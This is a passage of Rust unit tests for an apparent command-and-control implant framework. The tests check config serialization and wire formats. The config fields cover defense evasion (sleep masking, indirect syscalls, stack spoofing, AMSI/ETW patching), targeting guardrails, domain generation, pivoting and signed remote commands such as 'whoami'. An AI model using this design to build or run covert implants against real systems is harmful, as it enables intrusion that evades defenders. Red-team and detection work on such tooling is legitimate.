            ["default","Mozilla/5.0",[["/default"],{},[]],[["/default"],{},[]],false],
            [],
            [],
            "k","s","10.0.0.1","b",4443,5,0,0,
            0,false,null,"",null,[],false,10,null,[],
            "foliage",false,false,false,false,
            "CORP*","DESKTOP-*",8,18,true
        ]"#;
        let config: C2Config = serde_json::from_str(json).unwrap();
        assert_eq!(config.sleep_mask, "foliage");
        assert!(!config.indirect_syscalls);
        assert!(!config.stack_spoof);
        assert!(!config.patch_amsi_etw);
        assert!(!config.heap_encrypt);
        assert_eq!(config.guard_domain, "CORP*");
        assert_eq!(config.guard_hostname, "DESKTOP-*");
        assert_eq!(config.guard_hour_start, 8);
        assert_eq!(config.guard_hour_end, 18);
        assert!(config.guard_no_system);
    }

    #[test]
    fn test_c2config_evasion_none_sleep_mask() {
        let json = r#"[
            0,
            ["default","Mozilla/5.0",[["/default"],{},[]],[["/default"],{},[]],false],
            [],
            [],
            "k","s","h","b",443,5,0,0,
            0,false,null,"",null,[],false,10,null,[],
            "none"
        ]"#;
        let config: C2Config = serde_json::from_str(json).unwrap();
        assert_eq!(config.sleep_mask, "none");
        // Other evasion fields still default to true
        assert!(config.indirect_syscalls);
        assert!(config.heap_encrypt);
    }

    #[test]
    fn test_c2config_auto_pivot_port_set() {
        let json = r#"[
            1,
            ["default","Mozilla/5.0",[["/default"],{},[]],[["/default"],{},[]],false],
            [],
            [],
            "k","s","10.0.0.1","b",5001,5,0,0,
            0,false,null,"",null,[],false,10,null,[],
            "ekko",true,true,true,true,"","",0,0,false,
            5002
        ]"#;
        let config: C2Config = serde_json::from_str(json).unwrap();
        assert_eq!(config.auto_pivot_port, Some(5002));
    }

    #[test]
    fn test_c2config_auto_pivot_port_null_explicit() {
        let json = r#"[
            1,
            ["default","Mozilla/5.0",[["/default"],{},[]],[["/default"],{},[]],false],
            [],
            [],
            "k","s","10.0.0.1","b",5001,5,0,0,
            0,false,null,"",null,[],false,10,null,[],
            "ekko",true,true,true,true,"","",0,0,false,
            null
        ]"#;
        let config: C2Config = serde_json::from_str(json).unwrap();
        assert!(config.auto_pivot_port.is_none());
    }

    #[test]
    fn test_c2config_missing_required_field_is_error() {
        // Only 11 elements: jitter_max (12th element) is missing and has no default.
        let json = r#"[
            0,
            ["default","Mozilla/5.0",[["/default"],{},[]],[["/default"],{},[]],false],
            [],
            [],
            "abc","xyz","h","b",443,30,10
        ]"#;
        assert!(serde_json::from_str::<C2Config>(json).is_err());
    }

    #[test]
    fn test_c2config_serde_round_trip_all_fields() {
        let config = full_config();
        let json = serde_json::to_string(&config).unwrap();
        // No field names may appear in the serialized form.
        for leaked in [
            "sleep_interval", "guard_domain", "c2_host", "fallback", "transport",
            "http_get", "data_transform", "dead_time_secs", "auto_pivot_port",
        ] {
            assert!(!json.contains(leaked), "field name leaked: {leaked}");
        }
        let rt: C2Config = serde_json::from_str(&json).unwrap();
        assert_eq!(rt.c2_host, config.c2_host);
        assert_eq!(rt.transport, TransportProtocol::Https);
        assert_eq!(rt.profile.name, "p1");
        assert_eq!(rt.profile.http_get.data_transform.len(), 2);
        assert_eq!(rt.proxy.url, "http://proxy:8080");
        assert!(!rt.proxy.use_system);
        assert_eq!(rt.fallback.endpoints.len(), 2);
        assert_eq!(rt.fallback.endpoints[1].weight, 9);
        assert_eq!(rt.fallback.strategy, FallbackStrategy::RoundRobin);
        assert_eq!(rt.fallback.dead_time_secs, 120);
        assert_eq!(rt.kill_date, Some(1_900_000_000));
        assert_eq!(rt.sni_override.as_deref(), Some("cdn.example.com"));
        assert_eq!(rt.task_batch_size, 4);
        assert_eq!(rt.dga.as_ref().unwrap().seed, 42);
        assert_eq!(rt.valid_parents, vec!["explorer.exe".to_string()]);
        assert_eq!(rt.sleep_mask, "foliage");
        assert!(!rt.indirect_syscalls);
        assert_eq!(rt.guard_hour_start, 8);
        assert!(rt.guard_no_system);
        assert_eq!(rt.auto_pivot_port, Some(5002));
    }

    #[test]
    fn test_c2config_pack_unpack_round_trip() {
        let config = full_config();
        let packed = config.pack();
        assert_eq!(packed[0], 0x01, "version byte must lead the blob");
        let rt = C2Config::unpack(&packed).expect("round-trip unpack");
        assert_eq!(rt.c2_host, config.c2_host);
        assert_eq!(rt.transport, TransportProtocol::Https);
        assert_eq!(rt.profile.name, "p1");
        assert_eq!(rt.profile.http_get.uris, vec!["/a".to_string(), "/b".to_string()]);
        assert_eq!(rt.profile.http_get.headers.get("Content-Type").unwrap(), "application/octet-stream");
        match &rt.profile.http_post.data_transform[0] {
            TransformStep::Mask(k) => assert_eq!(k, &vec![1u8, 2, 3]),
            _ => panic!("wrong transform variant"),
        }
        assert_eq!(rt.proxy.url, "http://proxy:8080");
        assert!(!rt.proxy.use_system);
        assert_eq!(rt.fallback.endpoints.len(), 2);
        assert_eq!(rt.fallback.endpoints[1].priority, 5);
        assert_eq!(rt.fallback.endpoints[1].proxy.as_ref().unwrap().use_system, true);
        assert_eq!(rt.fallback.strategy, FallbackStrategy::RoundRobin);
        assert_eq!(rt.fallback.dead_time_secs, 120);
        assert_eq!(rt.tunnel_port, 4443);
        assert_eq!(rt.sleep_interval, 30);
        assert_eq!(rt.jitter_min, 10);
        assert_eq!(rt.jitter_max, 20);
        assert_eq!(rt.bloat_mb, 7);
        assert!(rt.debug);
        assert_eq!(rt.kill_date, Some(1_900_000_000));
        assert_eq!(rt.challenge_key, "ck");
        assert_eq!(rt.sni_override.as_deref(), Some("cdn.example.com"));
        assert_eq!(rt.alpn_protocols, vec!["http/1.1".to_string()]);
        assert!(rt.hibernation_mode);
        assert_eq!(rt.task_batch_size, 4);
        let dga = rt.dga.as_ref().unwrap();
        assert_eq!(dga.seed, 42);
        assert_eq!(dga.tlds, vec!["io".to_string()]);
        assert_eq!(dga.max_failures_per_domain, 2);
        assert_eq!(rt.valid_parents, vec!["explorer.exe".to_string()]);
        assert_eq!(rt.sleep_mask, "foliage");
        assert!(!rt.indirect_syscalls);
        assert!(rt.stack_spoof);
        assert!(!rt.patch_amsi_etw);
        assert!(rt.heap_encrypt);
        assert_eq!(rt.guard_domain, "CORP*");
        assert_eq!(rt.guard_hostname, "WKS??");
        assert_eq!(rt.guard_hour_start, 8);
        assert_eq!(rt.guard_hour_end, 18);
        assert!(rt.guard_no_system);
        assert_eq!(rt.auto_pivot_port, Some(5002));
    }

    #[test]
    fn test_c2config_unpack_strict() {
        let config = full_config();
        let packed = config.pack();
        // Trailing bytes rejected
        let mut extra = packed.clone();
        extra.push(0xFF);
        assert!(C2Config::unpack(&extra).is_none());
        // Truncation rejected
        assert!(C2Config::unpack(&packed[..packed.len() - 1]).is_none());
        // Wrong version rejected
        let mut badver = packed.clone();
        badver[0] = 0x02;
        assert!(C2Config::unpack(&badver).is_none());
        // Empty input rejected
        assert!(C2Config::unpack(&[]).is_none());
    }

    #[test]
    fn test_secured_command_wire_round_trip() {
        let cmd = SecuredCommand {
            session_id: "sess1".into(),
            counter: 42,
            nonce: 12345,
            timestamp: chrono::DateTime::parse_from_rfc3339("2024-01-15T10:30:00+00:00")
                .unwrap().with_timezone(&chrono::Utc),
            command: "whoami".into(),
            signature: "c2ln".into(),
        };
        let json = serde_json::to_string(&cmd).unwrap();
        let rt: SecuredCommand = serde_json::from_str(&json).unwrap();
        assert_eq!(rt.session_id, "sess1");
        assert_eq!(rt.counter, 42);
        assert_eq!(rt.nonce, 12345);
        // RFC3339 string on the wire; signable bytes must be identical.
        assert!(json.contains("2024-01-15T10:30:00"));
        assert_eq!(rt.get_signable_bytes(), cmd.get_signable_bytes());
        assert_eq!(rt.command, "whoami");
        assert_eq!(rt.signature, "c2ln");
    }

    #[test]
    fn test_command_response_wire_round_trip() {
        let resp = CommandResponse {
            request_id: 7,
            output: "out".into(),
            error: String::new(),
            exit_code: -1,
        };
        let json = serde_json::to_string(&resp).unwrap();
        assert_eq!(json, "[7,\"out\",\"\",-1]");
        let rt: CommandResponse = serde_json::from_str(&json).unwrap();
        assert_eq!(rt.request_id, 7);
        assert_eq!(rt.output, "out");
        assert_eq!(rt.exit_code, -1);
    }

    #[test]
    fn test_client_hello_wire_round_trip() {
        let hello = ClientHello {
            hostname: "wks1".into(),
            os: "windows".into(),
            computer_id: "cid".into(),
            exe_id: "eid".into(),
            build_id: "bid".into(),
            auth_hmac: "hmac".into(),
            reg_timestamp: "2024-01-15T10:30:00+00:00".into(),
            interfaces: vec![NetworkInterface {
                name: "eth0".into(),
                addresses: vec!["10.0.0.5/24".into()],
                flags: vec!["UP".into()],
            }],
            hibernation_mode: true,
            task_batch_size: 3,
        };
        let json = serde_json::to_string(&hello).unwrap();
        let rt: ClientHello = serde_json::from_str(&json).unwrap();
        assert_eq!(rt.hostname, "wks1");
        assert_eq!(rt.interfaces.len(), 1);
        assert_eq!(rt.interfaces[0].addresses[0], "10.0.0.5/24");
        assert!(rt.hibernation_mode);
        assert_eq!(rt.task_batch_size, 3);

        // Truncated hello: only required fields; optional tail defaults.
        let min: ClientHello = serde_json::from_str(
            r#"["wks2","linux","cid","eid","bid"]"#
        ).unwrap();
        assert!(min.auth_hmac.is_empty());
        assert!(min.interfaces.is_empty());
        assert!(!min.hibernation_mode);
        assert_eq!(min.task_batch_size, 10);
    }

    #[test]
    fn test_handshake_wire_round_trip() {
        let ch = HandshakeChallenge { nonce: "n".into(), server_proof: "sp".into() };
        let json = serde_json::to_string(&ch).unwrap();
        assert_eq!(json, "[\"n\",\"sp\"]");
        let rt: HandshakeChallenge = serde_json::from_str(&json).unwrap();
        assert_eq!(rt.nonce, "n");

        let resp = HandshakeResponse { hmac: "h".into() };
        let json = serde_json::to_string(&resp).unwrap();
        assert_eq!(json, "[\"h\"]");
        let rt: HandshakeResponse = serde_json::from_str(&json).unwrap();
        assert_eq!(rt.hmac, "h");
    }

    #[test]
    fn test_pivot_frame_wire_round_trip() {
        let frame = PivotFrame {
            stream_id: 1, destination: 2, source: 3,
            data: vec![9, 8, 7], metadata: "m".into(),
        };
        let json = serde_json::to_string(&frame).unwrap();
        let rt: PivotFrame = serde_json::from_str(&json).unwrap();
        assert_eq!(rt.stream_id, 1);
        assert_eq!(rt.data, vec![9u8, 8, 7]);
        assert_eq!(rt.metadata, "m");
        // metadata defaults to "" when truncated
        let min: PivotFrame = serde_json::from_str("[1,2,3,[9]]").unwrap();
        assert!(min.metadata.is_empty());
    }

    #[test]
    fn test_malleable_profile_default() {
        let p = MalleableProfile::default();
        assert_eq!(p.name, "default");
        assert!(!p.format_http);
        assert!(!p.http_get.uris.is_empty());
    }

    #[test]
    fn test_proxy_config_default() {
        let p = ProxyConfig::default();
        assert!(p.use_system);
        assert!(p.url.is_empty());
    }

    #[test]
    fn test_session_last_seen() {
        let (tx, _rx) = tokio::sync::mpsc::unbounded_channel();
        let session = Session {
            id: 1, computer_id: "test".into(), addr: "127.0.0.1:1234".parse().unwrap(),
            hostname: "test".into(), os: "linux".into(), tx,
            signing_key: ed25519_dalek::SigningKey::from_bytes(&[0u8; 32]),
            parent_id: None,
            last_seen: std::sync::Arc::new(std::sync::atomic::AtomicI64::new(chrono::Utc::now().timestamp())),
            interfaces: vec![],
            hibernation_mode: false,
        };
        assert!(session.seconds_since_seen() < 2);
        session.touch();
        assert!(session.seconds_since_seen() < 2);
    }
}
